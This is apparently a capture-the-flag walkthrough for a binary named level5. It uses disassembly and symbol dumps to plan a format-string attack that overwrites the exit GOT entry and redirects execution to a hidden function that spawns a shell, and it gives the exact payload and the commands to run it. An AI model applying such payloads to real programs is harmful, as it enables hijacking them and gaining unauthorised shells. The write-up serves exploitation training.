@@ -1,0 +1,53 @@
+
+#> nm -nr ./level5
+ [...]
+08049854 B m
+08048504 T main
+080484c2 T n
+080484a4 T o
+ [...]
+
+#> strings ./level5
+ [...]
+gets
+printf
+system
+/bin/sh
+ [...]
+
+#> objdump -d ./level5
+ [...]
+<n>:
+ [...]
+ 80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt>
+ [...]
+<exit@plt>:
+ 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
+ [...]
+
+#> objdump -R ./level5
+ [...]
+08049838 R_386_JUMP_SLOT   exit@GLIBC_2.0
+ [...]
+
+#> readelf --sections ./level5
+ [...]
+  [23] .got.plt          PROGBITS        08049818 000818 000028 04  WA  0   0  4
+ [...]
+
+Same as previous level except this time we want to redirect
+the the jump in exit to <o>.
+
+Infact the regular program never goes to o.
+We can't write directly on the text section to change the call
+so we have to change something in the other sections.
+
+Looking at <exit@plt> we can see it jumps to the global offset table.
+This section is writable.
+Changing the value of this address to <o>'s location will do the trick.
+
+Thus:
+"\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x%4$hn%31904x%5$hn"
+#> python -c 'print format' > /tmp/l5
+#> time cat /tmp/l5 - | ./level4
+
